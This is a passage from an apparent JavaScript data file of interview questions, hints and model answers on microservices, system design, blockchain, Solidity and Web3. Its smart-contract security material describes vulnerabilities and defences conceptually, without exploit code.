      { q:'How do you handle service discovery and load balancing in microservices?', hint:'Client-side: Eureka + Ribbon. Server-side: AWS ALB, Kubernetes Service. Service mesh: Istio sidecar proxy. DNS-based: Kubernetes DNS. Health checks drive registration. Consul for multi-cloud.', answer:`Service discovery addresses the problem of services finding each other when instances start and stop dynamically. Client-side discovery: each service queries a registry (Consul, Eureka) to get available instances and performs load balancing in the client (Ribbon library). Server-side discovery: a load balancer (AWS ALB, NGINX, Kubernetes Service) handles instance tracking and routing - simpler for services as they just call a stable DNS name. Kubernetes has built-in DNS-based service discovery: a Service object creates a stable DNS name (my-service.namespace.svc.cluster.local) that routes to healthy pods via kube-proxy. A service mesh (Istio, Linkerd) uses sidecar proxies alongside each service container to handle service discovery, load balancing, mutual TLS, circuit breaking, and observability without code changes - the proxy intercepts all traffic. I use Kubernetes Services + Ingress for most deployments, and add Istio when advanced traffic management (canary, circuit breaking at the infrastructure level) or mTLS between services is required.` },
      { q:'What is the Circuit Breaker pattern and why is it important in microservices?', hint:'Circuit breaker: stops calling a failing service. States: Closed (normal), Open (failing, short-circuit), Half-Open (testing recovery). Resilience4j, Hystrix. Prevents cascading failures. Timeout + retry + fallback.', answer:`The Circuit Breaker pattern prevents a slow or failing service from cascading failures across the system. Analogy: like an electrical circuit breaker, it "trips" when a failure threshold is exceeded. States: Closed (normal operation, requests pass through, failures counted); Open (circuit is tripped - requests immediately fail without calling the downstream service, preventing resource exhaustion and enabling the failing service to recover); Half-Open (after a timeout, a probe request tests recovery; if it succeeds, circuit closes; if it fails, circuit opens again). Resilience4j (Java) or similar libraries implement circuit breakers: configure failure rate threshold (50%), slow call rate threshold (10 seconds), and wait duration in open state. Complement with timeout (never wait indefinitely), retry with exponential back-off (for transient failures), fallback logic (return cached data or a degraded response), and bulkhead (limit concurrent calls to prevent one dependency consuming all threads). These patterns together form a resilience strategy essential for microservices where any service can fail independently.` },
      { q:'How do you implement distributed tracing in microservices?', hint:'Trace ID propagated in headers. Span: unit of work. OpenTelemetry: standard instrumentation. Jaeger/Zipkin: tracing backends. Auto-instrumentation via agent. Sampling strategy. Correlate with logs and metrics.', answer:`Distributed tracing tracks a request as it flows across multiple services. Each request gets a unique Trace ID generated at the entry point (API gateway or first service); this ID propagates in request headers (W3C Trace Context standard: traceparent header). Each service records a Span representing its portion of the work - spans have start time, duration, service name, and operation name, and they are linked to the parent span. OpenTelemetry is now the standard instrumentation library, replacing proprietary SDKs for Jaeger, Zipkin, and others - instrumentation once, route to any backend. Auto-instrumentation agents (OpenTelemetry Java agent, Python agent) add tracing without code changes for common frameworks (Spring Boot, Flask, Express). Sampling: tracing every request is expensive; trace 10% of traffic normally but 100% of errors. I correlate traces with logs by injecting the Trace ID into log messages - when a trace shows latency in a service, the correlated logs explain why. Grafana Tempo or AWS X-Ray provide the storage and visualisation layer.` },
      { q:'How do you manage data consistency across microservices?', hint:'Each service owns its data. No shared databases. Eventual consistency via events. Saga pattern for distributed transactions. Outbox pattern for reliable event publishing. CQRS for query separation. Idempotency.', answer:`Microservices should not share databases - that creates tight coupling and defeats independent deployability. Each service owns its data store. This means cross-service queries and transactions require explicit patterns. For distributed transactions, the Saga pattern orchestrates a sequence of local transactions with compensating transactions for rollback: Order service creates order, publishes OrderCreated event; Payment service charges card, publishes PaymentProcessed; Inventory service reserves items. If any step fails, compensating events trigger rollbacks. The Outbox Pattern solves the dual-write problem - writing to the database and publishing an event must happen atomically. Solution: write the event to an outbox table in the same database transaction as the domain change; a separate process reads and publishes the events (transactional messaging). CQRS separates read and write models - the write side emits events; the read side materialises optimised views. All consumers must handle duplicate events (idempotency) since at-least-once delivery is the safe default in messaging systems.` },
      { q:'How do you secure microservices? Explain mutual TLS and JWT authentication.', hint:'JWT at the perimeter: API gateway validates. Service-to-service: mTLS (both sides present certificates). Zero-trust networking. API gateway: rate limiting, auth, routing. Secrets management. Network policies.', answer:`Microservices security operates at multiple layers. At the perimeter, the API gateway authenticates external requests - validating JWT tokens issued by the identity provider (Auth0, Keycloak, AWS Cognito). The gateway enforces rate limiting, input validation, and routes to downstream services. Service-to-service communication uses mutual TLS (mTLS): both the client and server present certificates, verifying both identities - this implements zero-trust networking where services cannot assume that traffic originating inside the network is safe. A service mesh (Istio, Linkerd) automates mTLS certificate rotation and enforcement without code changes. JWT token propagation: the API gateway may pass the user JWT to downstream services so they can verify user identity and claims without calling the identity provider on every request. Kubernetes Network Policies restrict which pods can communicate, implementing network-level segmentation. Secrets (database passwords, API keys) are stored in Vault or Kubernetes Secrets (sealed with Sealed Secrets or External Secrets Operator) and mounted into pods, never stored in container images.` },
    ],
    'system design': [
      { q:'How do you approach a system design interview? Walk me through your framework.', hint:'Clarify requirements: scale, constraints. Back-of-envelope: traffic, storage estimates. High-level design. Deep dive: bottlenecks, databases, caching. Trade-offs. APIs. Data model.', answer:`System design interviews assess structured thinking, not a single correct answer. My framework: Step 1 - Clarify requirements. Ask about scale (users, requests per second, data volume), read/write ratio, latency requirements, consistency requirements, and out-of-scope features. Step 2 - Back-of-envelope estimation. Calculate daily active users, QPS (queries per second), storage requirements, and bandwidth to inform design choices. Example: 10M users, 1% post per day = 100K writes/day = ~1 write/second; 100:1 read/write ratio = 100 reads/second - this fits on a single server, so microservices are overkill. Step 3 - High-level design. Draw the major components: clients, API gateway, services, databases, caches, CDN. Step 4 - Deep dive. Pick the most interesting or risky component and go deep - database schema, cache invalidation strategy, handling failures. Step 5 - Trade-offs. Explicitly discuss what the design sacrifices and why those trade-offs make sense. Interviewers value clear communication of reasoning over textbook answers.` },
      { q:'How would you design a URL shortener like bit.ly?', hint:'Requirements: shorten URL, redirect, analytics. Encoding: base62 6-char code. DB: id + long URL. Cache hot URLs. CDN for redirects. Analytics: async via Kafka. Scale: writes vs reads (read-heavy).', answer:`Requirements: generate a short URL, redirect short URL to original, optional analytics. Scale: assume 100M URLs created per day = ~1,200 writes/second; 10:1 read ratio = 12,000 redirects/second. Short code generation: use a base62 encoding (a-z, A-Z, 0-9) of an auto-incrementing ID - 6 characters = 62^6 = 56 billion combinations. Database: relational for URL storage (id, short_code, long_url, created_at, user_id) with unique index on short_code. For redirect performance, cache hot URLs in Redis - a small percentage of URLs account for the vast majority of traffic. Redirect flow: client hits short URL, server checks Redis cache, on miss queries DB and caches result, returns 301 (permanent) or 302 (temporary, for tracking) redirect. For analytics, write click events asynchronously to Kafka - a separate analytics service consumes events and writes to a data warehouse (ClickHouse or BigQuery) for aggregation. At 12,000 reads/second, a single Redis instance handles the load; for global scale, use CDN for redirect caching.` },
      { q:'How would you design a rate limiter?', hint:'Algorithms: token bucket (burst allowed), leaky bucket (steady rate), fixed window (reset edge), sliding window log, sliding window counter. Redis: atomic INCR + EXPIRE. Distributed: central state. Middleware placement.', answer:`Rate limiting prevents abuse and ensures fair resource usage. Algorithm choice depends on requirements. Token bucket: tokens added at fixed rate (10/second), removed on each request, up to a burst capacity - allows bursts while maintaining average rate. Leaky bucket: requests queue and process at a steady drain rate - smooths traffic but adds latency. Fixed window counter: count requests per time window (1-minute window, limit 100) - simple but has edge-case bursts at window boundaries. Sliding window log: record timestamp of each request, count within last N seconds - precise but memory-intensive. Sliding window counter: blend of fixed windows, approximates sliding window with low memory. Implementation: Redis INCR with EXPIRE for atomic counters - INCR key; EXPIRE key 60 returns the count and sets expiry in one operation. For distributed systems, Redis ensures all servers share state. Placement: API gateway level for external rate limiting; service level for inter-service protection. Rate limit headers (X-RateLimit-Remaining, Retry-After) communicate limits to clients.` },
      { q:'How would you design a notification system at scale?', hint:'Multi-channel: push, email, SMS. Message queue decouples. Fan-out on write (active users) vs fan-out on read (inactive users). Deduplication. Delivery tracking. User preferences. Template rendering. At-least-once delivery with idempotency.', answer:`A notification system at scale must handle multi-channel delivery (push notifications, email, SMS), high volume, and varying latency requirements. Architecture: an event producer (order service, social service) publishes events to a message queue (Kafka). A notification service consumes events, looks up user preferences (has the user opted out? preferred channel?), applies rate limiting per user (avoid spamming), and routes to channel-specific workers. Push notification worker uses APNs (iOS) and FCM (Android) - batch up to 500 notifications per API call. Email worker uses SendGrid or SES with template rendering. SMS uses Twilio. Fan-out challenges: a celebrity user with 10M followers creates 10M notifications from one post. Fan-out on write pre-computes - populate each follower timeline immediately, good for active users with reasonable follower counts. Fan-out on read computes the feed on request - better for inactive users. Delivery tracking: store notification state (sent, delivered, opened) for analytics and retry logic. Idempotency prevents duplicate notifications if a worker crashes mid-processing.` },
      { q:'How would you design a distributed cache? Explain consistency and eviction.', hint:'Cache aside vs write-through vs write-behind. Eviction: LRU, LFU, TTL. Consistency: cache invalidation problem. Thundering herd. Redis cluster: consistent hashing. Cache warming. Hot key problem.', answer:`Cache design decisions: placement (cache aside - application checks cache, misses query DB; write-through - write to cache and DB together; write-behind/write-back - write to cache, async write to DB for write-heavy workloads). Cache aside is most common: check Redis first, on miss fetch from DB and populate cache with TTL. Consistency is the hardest problem - when data changes, the cache must be invalidated or updated. Cache invalidation strategies: TTL-based expiry (eventual consistency), explicit invalidation on write (tight consistency but dual-write risk), and event-driven invalidation via CDC (Change Data Capture). Thundering herd: when a hot cached item expires, thousands of simultaneous requests all miss the cache and hammer the database. Solutions: mutex lock (first request locks and populates, others wait), stale-while-revalidate (return stale data while refreshing asynchronously), or probabilistic early expiry. Hot key problem: one key receives extreme traffic (celebrity post) - solution: local in-process caching for the hottest keys, or splitting a single key into multiple shards. Eviction policies: LRU (Least Recently Used) for general workloads; LFU (Least Frequently Used) for stable popular content.` },
      { q:'How would you design a ride-sharing application like Uber?', hint:'Location updates: drivers push GPS. Geospatial indexing: Geohash or QuadTree. Matching: find nearby drivers, match algorithm. Trip state machine. Pricing: surge. Real-time: WebSocket. Data model: trip, driver, rider.', answer:`Ride-sharing has two core challenges: geospatial matching and real-time location updates. Location service: drivers send GPS updates every 4 seconds via WebSocket or HTTP. These updates write to a location store optimised for geospatial queries - Redis with Geo commands (GEOADD, GEORADIUS) or a database with PostGIS. Geohash divides the earth into a grid of cells; nearby drivers share the same geohash prefix, enabling efficient range queries. Matching service: when a rider requests, query nearby drivers within 5km, rank by ETA (computed via routing engine), send request to best-matched driver. Accept/decline with timeout (driver gets 15 seconds to accept). Trip state machine: requested > accepted > driver en route > driver arrived > in trip > completed > payment processed - each state transition persists to the database. Real-time communication: rider and driver share a WebSocket connection to the trip service, receiving location updates and status changes. Pricing: surge multiplier computed from supply (available drivers) to demand (active ride requests) ratio in a geohash cell. Separate services: pricing, mapping/routing, payment, notifications - each independently scalable.` },
      { q:'How do you design for high availability and fault tolerance?', hint:'Single points of failure. Redundancy: active-active vs active-passive. Health checks. Circuit breakers. Graceful degradation. Multi-region. Chaos engineering. SLA: availability percentages to downtime.', answer:`High availability is designed by eliminating single points of failure at every layer. Infrastructure: multiple instances of every service behind a load balancer with health checks - unhealthy instances receive no traffic. Databases use primary-replica replication; for synchronous replication, a replica can become primary within seconds of a failure (automatic failover with Aurora, RDS Multi-AZ). Active-active: multiple regions serving traffic simultaneously, providing both redundancy and geographic latency reduction. Active-passive: standby region receives replicated data but serves no traffic until failover. For 99.99% availability (52 minutes downtime/year), you need multi-AZ at minimum; for 99.999% (5 minutes/year), multi-region with active-active. Graceful degradation: when dependencies fail, serve a degraded response rather than erroring completely (show cached product data when pricing service is down). Chaos engineering (Netflix Chaos Monkey philosophy) deliberately introduces failures in production or staging to verify resilience - if you do not test your failure scenarios, they will surprise you. Document your RTO (Recovery Time Objective) and RPO (Recovery Point Objective) and design to meet them.` },
    ],
    blockchain: [
      { q:'Explain how blockchain achieves immutability and decentralisation.', hint:'Hash chain: each block contains previous block hash. Merkle tree for transactions. Consensus: PoW/PoS prevents single actor control. 51% attack. Nodes hold full copy. Immutability: altering a block invalidates all subsequent hashes.', answer:`Blockchain immutability comes from cryptographic chaining. Each block contains a cryptographic hash of the previous block header, a Merkle tree root of transactions, a timestamp, and a nonce. Changing any transaction in a block changes the Merkle root, which changes the block hash, which invalidates every subsequent block's previous-hash field - an attacker must recompute all subsequent blocks simultaneously while the honest network keeps extending the chain. This is computationally infeasible with Proof of Work unless the attacker controls more than 50% of network hash rate (51% attack). Decentralisation means no single entity controls the network - thousands of full nodes independently validate every block and transaction against consensus rules. If a miner produces an invalid block, nodes reject it regardless of hash power. This permissionless participation and economic incentive alignment (miners earn rewards for valid blocks) maintains the network without central authority.` },
      { q:'What is the difference between Proof of Work and Proof of Stake?', hint:'PoW: solve hash puzzle (computational energy). Miner earns block reward. Bitcoin. PoS: validators stake tokens as collateral, selected probabilistically. Less energy. Ethereum migrated. Slashing for malicious behaviour.', answer:`Proof of Work requires miners to solve a computationally difficult puzzle (find a nonce such that SHA-256 of the block header has a required number of leading zeros). This work proves energy expenditure, and the honest chain (most cumulative work) wins. PoW is battle-tested (Bitcoin since 2009) but consumes enormous energy. Proof of Stake replaces computational work with economic stake - validators lock (stake) cryptocurrency as collateral. The protocol selects a validator to propose the next block, weighted by stake. Dishonest behaviour (double-signing, equivocation) is punishable by slashing - the validator loses a portion of their stake. PoS uses 99.9% less energy than PoW. Ethereum migrated from PoW to PoS in "The Merge" (September 2022), reducing its energy consumption by 99.95%. Critics argue PoS favours wealthy validators (wealth concentration), while PoW proponents argue physical energy expenditure creates more objective security. Both mechanisms align economic incentives with honest behaviour.` },
      { q:'What is a smart contract and how does it work on Ethereum?', hint:'Self-executing code on blockchain. EVM bytecode. Solidity compiles to bytecode. Deterministic execution across all nodes. Gas: execution cost. Immutable once deployed (unless upgradeable proxy pattern). Events for logging.', answer:`A smart contract is code deployed to a blockchain that executes automatically when conditions are met - no intermediary required. On Ethereum, smart contracts are written in Solidity (or Vyper), compiled to EVM (Ethereum Virtual Machine) bytecode, and deployed to a blockchain address. Every Ethereum node runs the EVM and executes the same bytecode deterministically - all nodes reach identical results, enabling trustless consensus on contract state. Execution costs gas proportional to computational complexity - this prevents infinite loops and spam. Once deployed, contract bytecode is immutable and cannot be changed (security guarantee but also a limitation - bugs cannot be patched without redeployment). The Proxy/Implementation pattern enables upgrades: a proxy contract delegates calls to an implementation contract; the proxy admin can point the proxy to a new implementation while preserving contract address and state. Events are emitted during execution and stored in transaction logs - cheaper than storage and useful for indexing off-chain (The Graph).` },
      { q:'What are DeFi and NFTs? Explain how they work technically.', hint:'DeFi: financial services via smart contracts. AMM (Uniswap): liquidity pools, x*y=k formula. Lending (Aave, Compound): collateralised loans. NFT: ERC-721 token, unique tokenId, ownership on-chain, metadata (IPFS).', answer:`DeFi (Decentralised Finance) replicates financial services - trading, lending, yield farming - via smart contracts without banks. Uniswap uses Automated Market Maker (AMM): liquidity pools hold two tokens (ETH/USDC); the price is determined by the constant product formula x*y=k. When you swap ETH for USDC, you add ETH to the pool and remove USDC proportionally, moving the price. Liquidity providers deposit both tokens and earn trading fees. Aave/Compound enable over-collateralised lending: deposit ETH worth $1,500 as collateral to borrow $1,000 USDC. Smart contracts enforce collateral ratios and liquidate positions that fall below minimum. NFTs (Non-Fungible Tokens) use ERC-721 standard: each token has a unique tokenId, and the contract maps tokenId to owner address. Ownership is on-chain; metadata (image, attributes) is typically stored off-chain on IPFS or Arweave - the on-chain URI points to the metadata. ERC-1155 enables semi-fungible tokens (multiple copies of the same item).` },
      { q:'What are the main security vulnerabilities in smart contracts?', hint:'Reentrancy: call external before updating state. Integer overflow (pre-Solidity 0.8). Access control: missing onlyOwner. Front-running: MEV. Unchecked return values. Oracle manipulation. Logic errors. Audit tools: Slither, Mythril.', answer:`Smart contract vulnerabilities are irreversible once exploited - funds lost to contract bugs cannot be recovered. Reentrancy is the most famous vulnerability (DAO hack, $60M): a malicious contract calls back into the victim contract before the initial execution completes, draining funds. Prevention: Checks-Effects-Interactions pattern - update state before making external calls; or use OpenZeppelin ReentrancyGuard. Integer overflow/underflow: before Solidity 0.8, arithmetic silently wrapped (uint256 max + 1 = 0). Use SafeMath or Solidity 0.8+ which reverts on overflow. Access control flaws: functions modifying state accessible without proper onlyOwner or role-based modifiers. Front-running: miners/validators see pending transactions and insert their own earlier (Miner Extractable Value). Unchecked return values: token transfer returning false instead of reverting if not checked. Oracle manipulation: price oracle with insufficient liquidity can be manipulated in one transaction. Security tools: Slither (static analysis), Mythril (symbolic execution), Echidna (fuzzing). Always get a professional audit before deploying contracts holding real value.` },
      { q:'How does Ethereum scaling work? Compare Layer 1 and Layer 2 solutions.', hint:'L1: sharding (danksharding). L2: Rollups - Optimistic (fraud proofs, 7-day withdrawal) vs ZK (validity proofs, fast finality). State channels. Sidechains (separate consensus). Polygon, Arbitrum, Optimism, zkSync.', answer:`Ethereum mainnet (Layer 1) processes ~15 transactions per second - insufficient for mass adoption. Layer 1 scaling: Ethereum roadmap includes danksharding to increase data availability for L2 rollups, but full sharding is years away. Layer 2 rollups process transactions off-chain and post compressed data and proofs to Ethereum mainnet. Optimistic Rollups (Arbitrum, Optimism): assume transactions are valid by default, post transaction data to L1, and rely on a challenge period (7 days) where anyone can submit a fraud proof for invalid transactions. Fast execution but slow withdrawal to L1. ZK-Rollups (zkSync, StarkNet, Polygon zkEVM): generate a zero-knowledge proof (validity proof) that proves all transactions are valid without revealing details. Verification is instant and provably correct, enabling faster L1 finality - but ZK proof generation is computationally intensive. State channels allow two parties to transact off-chain and settle final state on-chain - optimal for bilateral high-frequency interactions (payment channels). Sidechains (Polygon PoS) have their own consensus mechanisms and provide Ethereum compatibility at low cost, but with different security assumptions than pure rollups.` },
      { q:'How do you interact with a blockchain from a web application?', hint:'Web3.js / ethers.js: JS libraries. Provider: MetaMask injects window.ethereum. Contract ABI + address. Call vs send (read vs write). Event listening. IPFS for off-chain data. The Graph for indexing. Alchemy/Infura as node provider.', answer:`Web3 frontend integration uses ethers.js (preferred, lighter than web3.js). Connect to the blockchain via a provider: MetaMask injects window.ethereum into the browser; const provider = new ethers.BrowserProvider(window.ethereum); const signer = await provider.getSigner() gives the connected wallet. Interact with contracts using the ABI (Application Binary Interface) and address: const contract = new ethers.Contract(address, abi, signer). Read calls (view/pure functions) do not cost gas and do not require wallet: contract.balanceOf(address). Write calls (state changes) require a transaction signed by the user: const tx = await contract.transfer(to, amount); await tx.wait() waits for confirmation. Listen to events: contract.on('Transfer', (from, to, amount, event) => {...}). For node infrastructure, I use Alchemy or Infura rather than running a node - they provide reliable RPC endpoints. The Graph provides indexed blockchain data via GraphQL, enabling efficient querying of historical events without scanning every block.` },
    ],
    solidity: [
      { q:'Explain Solidity data types, storage locations, and gas implications.', hint:'Value types: uint, int, bool, address, bytes, enums. Reference types: arrays, structs, mappings. Storage: persistent (expensive). Memory: temporary (cheap). Calldata: read-only function params. Stack: local value types.', answer:`Solidity has value types (stored by value on the stack or in storage) and reference types (stored by reference). Value types: uint256 (default unsigned integer), int256 (signed), bool, address (20-byte Ethereum address), address payable (can receive ETH), bytes1-32 (fixed-size byte arrays). Reference types: dynamic arrays (uint[]), structs (custom data shapes), and mappings (hash tables: mapping(address => uint)). Storage locations determine gas costs dramatically. Storage (state variables) persists on the blockchain - reading costs 2,100 gas (cold) or 100 gas (warm), writing costs 20,000 gas (new) or 2,900 gas (update). Memory is temporary within a function call - cheap allocation for arrays and strings. Calldata is read-only function parameter data from the transaction - cheapest for external function parameters since no copying is needed. Stack holds local value types. Gas optimisation: cache state variables in memory variables for functions that read the same state multiple times; use calldata instead of memory for external function array/string parameters.` },
      { q:'How does inheritance work in Solidity? Explain interfaces and abstract contracts.', hint:'Multiple inheritance (C3 linearisation). override/virtual keywords. super calls. Interface: no state, no implementation, all external. Abstract: partial implementation. Modifiers for shared logic.', answer:`Solidity supports multiple inheritance using C3 linearisation (MRO) - the same algorithm Python uses for method resolution. Virtual functions can be overridden by child contracts; override keyword is required on the overriding function. super.functionName() calls the parent implementation. For diamond inheritance (A inherits from B and C, both inherit from D), C3 linearisation determines the resolution order. Interfaces define function signatures that implementing contracts must provide - no state variables, no function bodies, all functions implicitly external. Contracts implementing an interface must implement all functions. Abstract contracts have at least one unimplemented function (marked virtual without a body) - they cannot be deployed directly but provide partial implementation for child contracts. Function modifiers (_ represents where the function body executes) extract repeated access control patterns: modifier onlyOwner { require(msg.sender == owner, "Not owner"); _; }. This reuse reduces both code size and gas costs.` },
      { q:'How do you handle errors in Solidity? Explain require, revert, and custom errors.', hint:'require(condition, "message"): input validation, refunds remaining gas. assert(): invariant checks, consumes all gas on failure. revert CustomError(): custom typed errors, cheaper than string messages. try/catch for external calls.', answer:`Solidity has three error-handling mechanisms. require(condition, "message") is for input validation and access control - if the condition is false, execution reverts, remaining gas is refunded, and the string error message is returned. assert(condition) is for invariant checks - internal conditions that should never be false (integer overflow in pre-0.8, logical invariants). assert failure consumes all gas, signalling a critical bug. revert() without condition is used for complex conditional reverting. Custom errors (Solidity 0.8.4+): error InsufficientBalance(uint256 available, uint256 required); revert InsufficientBalance(balance, amount); - custom errors are ABI-encoded and cost less gas than string messages (no string storage). They are also richer for clients to decode and display meaningful error messages. try/catch handles external contract call failures: try externalContract.call() returns (value) { ... } catch Error(string memory reason) { ... } catches revert strings; catch (bytes memory data) { ... } catches custom errors.` },
      { q:'What are Solidity events and how are they used?', hint:'Events emitted during execution. Stored in transaction receipt logs. Cheaper than storage. Off-chain indexing: The Graph, ethers.js event listeners. Indexed parameters: up to 3, enable filtering. Anonymous events.', answer:`Events are Solidity mechanism for logging data to transaction receipts - they are stored in the EVM log structure associated with the transaction, not in contract storage, making them significantly cheaper. Syntax: event Transfer(address indexed from, address indexed to, uint256 amount); emit Transfer(msg.sender, recipient, amount). Indexed parameters (up to 3) are stored as topics in the log, enabling efficient filtering by clients without scanning all events: contract.queryFilter(contract.filters.Transfer(null, userAddress)) finds all transfers to a specific address. Non-indexed parameters are ABI-encoded in the data field. Use cases: tracking token transfers (ERC-20 requires Transfer and Approval events), emitting state change notifications for off-chain systems, providing an audit trail. The Graph protocol indexes event logs into a queryable subgraph - this is how most DeFi frontends efficiently query historical protocol state (all swaps for a pool, user trading history) without scanning blocks manually.` },
      { q:'How do you write secure Solidity code? Explain common patterns and best practices.', hint:'Checks-Effects-Interactions pattern. Pull over push payments. Access control: OpenZeppelin Ownable, AccessControl. OpenZeppelin library reuse. Integer arithmetic: 0.8+ built-in overflow checks. Avoid tx.origin for auth. Timelocks.', answer:`Secure Solidity development follows established patterns. Checks-Effects-Interactions: in every function, perform all checks first (require statements, access control), then update state, then make external calls - this prevents reentrancy by ensuring state reflects the completed operation before any external code can re-enter. Pull over push payments: instead of sending ETH to users (push, which can fail and create DoS), record their balance and let them withdraw (pull) - this isolates payment failures from business logic. Use OpenZeppelin contracts for standard functionality - Ownable, AccessControl, ERC-20/721 implementations, ReentrancyGuard, Pausable have been audited by thousands of security researchers. Never use tx.origin for authentication - a malicious contract can trick a user into calling it, then relay the call to your contract while tx.origin is still the victim user; use msg.sender. For upgradeable contracts, OpenZeppelin TransparentProxy or UUPS patterns are the standard. Timelocks on critical admin functions give users time to react to changes.` },
      { q:'What is the ABI and how does Solidity interact with other contracts?', hint:'ABI: JSON interface describing functions and events. Encodes function calls as bytecode. Low-level call vs interface-based interaction. staticcall for read-only. delegatecall: run code in caller context. ABI encoding.', answer:`The ABI (Application Binary Interface) is a JSON specification describing a contract public functions, parameters, return types, and events. It enables clients (frontend, other contracts, ethers.js) to encode function calls correctly - function selector is the first 4 bytes of keccak256 of the function signature (keccak256("transfer(address,uint256)")[0:4]), followed by ABI-encoded parameters. Contract-to-contract interaction: define an interface matching the target contract, cast the address to the interface type, then call functions normally - the compiler handles ABI encoding. Low-level call: (bool success, bytes memory data) = address.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount)) - more flexible but requires manual error checking. staticcall is call that cannot modify state - used for view function calls. delegatecall executes the target code in the caller storage context - used by proxy patterns where the proxy stores state but delegate execution to an implementation contract.` },
      { q:'How do you test and deploy Solidity smart contracts?', hint:'Hardhat or Foundry. Unit tests: JavaScript (Hardhat) or Solidity (Foundry forge). Local network: Hardhat Network, Anvil. Testnet deployment: Sepolia, Goerli. Hardhat scripts or Foundry scripts. Etherscan verification. OpenZeppelin Upgrades plugin.', answer:`The two primary development frameworks are Hardhat (JavaScript/TypeScript ecosystem) and Foundry (Rust-based, Solidity tests). Hardhat: configure networks in hardhat.config.js, write tests in JavaScript/TypeScript using ethers.js and chai, run on Hardhat Network (local EVM fork). npx hardhat test runs the suite; npx hardhat run scripts/deploy.js --network sepolia deploys to testnet. Foundry: forge test runs Solidity test files (contract tests with setUp, testXxx functions), anvil runs a local node, forge script deploys. Foundry advantages: fuzzing built-in (forge test runs random inputs against invariants), faster test execution, and Solidity tests feel more natural for contract logic. Testnets (Sepolia, Goerli) allow testing with fake ETH before mainnet. I always verify contracts on Etherscan after deployment (npx hardhat verify or forge verify-contract) - open-source contracts build user trust and enable security researchers to find issues. For upgradeable contracts, OpenZeppelin Hardhat Upgrades plugin manages proxy deployment and validation.` },
    ],
    web3: [
      { q:'What is Web3 and how does it differ from Web2?', hint:'Web1: read-only static. Web2: read-write, centralised platforms (Google, Facebook). Web3: read-write-own, decentralised, user-controlled identity and data. Blockchain, tokens, DAOs. Criticism: still depends on centralised infrastructure.', answer:`Web1 (1990s-early 2000s) was read-only - static websites, users consumed content. Web2 (2000s-present) added read-write - users generate content on platforms like Facebook, Twitter, and Google. The trade-off: platforms own all data, monetise user attention, and can deplatform anyone. Web3 adds ownership - users control their identity (wallets, not usernames), assets (tokens, NFTs), and potentially governance (DAOs). Key primitives: blockchains for trustless state machines, tokens for programmable value and governance rights, smart contracts for self-executing agreements, and decentralised identity (ENS names, DIDs). Practical Web3 applications: DeFi (permissionless financial services), NFT marketplaces (verifiable digital ownership), DAOs (decentralised organisation governance via token voting), and decentralised storage (IPFS, Arweave). Criticism: most "decentralised" applications still rely on centralised APIs (Infura, Alchemy), front-ends hosted on AWS, and exchanges that custody user funds. True decentralisation is a spectrum, and current Web3 is far from the ideal.` },
      { q:'How does a Web3 wallet work? Explain private keys, public keys, and wallet connect.', hint:'Asymmetric cryptography: private key generates public key via ECDSA on secp256k1. Address = last 20 bytes of keccak256(publicKey). Seed phrase: BIP-39 mnemonic generates hierarchical deterministic keys. WalletConnect: QR code pairing, relay server.', answer:`Ethereum uses ECDSA (Elliptic Curve Digital Signature Algorithm) on the secp256k1 curve. A private key is a 256-bit random number. Multiplying by the generator point of secp256k1 produces the public key. The Ethereum address is the last 20 bytes of keccak256(publicKey) - a one-way transformation. Signing a transaction with the private key produces a signature that anyone can verify using the public key, proving the transaction was authorised by the key owner. Seed phrases (BIP-39): a 12 or 24-word mnemonic encodes the master seed, which generates a hierarchy of key pairs (BIP-32/44) - one seed generates all your accounts deterministically. Losing the seed phrase means losing all funds. MetaMask and other browser extension wallets store the encrypted private key locally. WalletConnect enables connecting mobile wallets to desktop dApps: a QR code encodes a session request; both parties communicate through a relay server to exchange signed messages and transaction approvals without the private key leaving the mobile device.` },
      { q:'What is IPFS and why is it used in Web3 applications?', hint:'IPFS: content-addressed storage. CID: hash of content. Files identified by what they are, not where they are. Pinning services: Pinata, NFT.Storage. NFT metadata storage. No single server. But: content not guaranteed available unless pinned.', answer:`IPFS (InterPlanetary File System) is a peer-to-peer distributed file system where content is addressed by its hash (CID - Content Identifier) rather than its location. This means the CID of a file uniquely identifies its content - if the content changes, the CID changes. This is important for NFT metadata: storing images and attributes on a central server means the owner of that server can change or remove them, making the NFT meaningless. Storing on IPFS ensures the metadata referenced by the on-chain CID cannot be altered without changing the CID. Limitations: IPFS does not guarantee availability - content is only accessible if at least one node is hosting it. Pinning services (Pinata, NFT.Storage, Filebase) provide persistent hosting for IPFS content, paying for continued availability. For truly permanent storage, Arweave uses an endowment model to guarantee storage for 200+ years. Web3 applications use IPFS for NFT media, dApp frontends (accessed via IPFS hash), and decentralised document storage - combined with ENS names for human-readable addressing.` },
      { q:'What is a DAO and how does governance work technically?', hint:'DAO: Decentralised Autonomous Organisation. Governance token: voting weight. On-chain voting: Governor contract (OpenZeppelin). Proposal lifecycle: created > active > succeeded/defeated > executed. Timelock for security. Snapshot for off-chain voting.', answer:`A DAO (Decentralised Autonomous Organisation) is an organisation governed by smart contracts and token holder votes rather than traditional corporate hierarchy. Token holders propose and vote on protocol changes, treasury allocation, and parameter updates. Technical implementation: OpenZeppelin Governor contract provides a battle-tested governance framework. Proposal lifecycle: a token holder creates a proposal (requires minimum token threshold), voting opens after a delay period (allowing token purchases for the vote is a governance attack vector - snapshot at proposal creation time), token holders vote for/against/abstain during the voting period, if quorum and majority requirements are met the proposal succeeds, a Timelock contract delays execution by a specified period (48-72 hours - giving users time to exit if they disagree with a change), then the proposer executes the transaction. Off-chain governance: Snapshot uses signed messages (no gas) for temperature checks and informal voting, with multisig execution for approved proposals. DAOs face challenges: voter apathy (low participation), plutocracy (large holders dominate), and coordination attacks.` },
